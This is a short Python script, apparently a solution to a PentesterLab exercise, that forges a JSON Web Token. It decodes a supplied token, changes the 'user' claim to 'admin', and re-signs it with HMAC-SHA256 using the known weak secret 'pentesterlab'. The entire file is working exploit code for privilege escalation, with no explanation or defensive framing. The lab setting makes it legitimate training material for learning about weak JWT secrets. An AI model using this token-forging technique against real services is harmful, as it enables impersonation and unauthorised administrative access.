#!/bin/python
import hashlib
import hmac
import base64
import json

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

header, data, signature = jwt.split('.')


def sign(data, secret):
    return base64.urlsafe_b64encode(hmac.new(secret, data, digestmod=hashlib.sha256).digest()).replace('=', '')

secret = 'pentesterlab'

# deocde payload
payload = json.loads(base64.urlsafe_b64decode(data+'=='))
# change user to admin and reencode
payload['user']='admin'
newdata = base64.urlsafe_b64encode(json.dumps(payload)).replace('=', '')

# print new token
print(header+'.'+newdata+'.'+sign(header+'.'+newdata, secret))

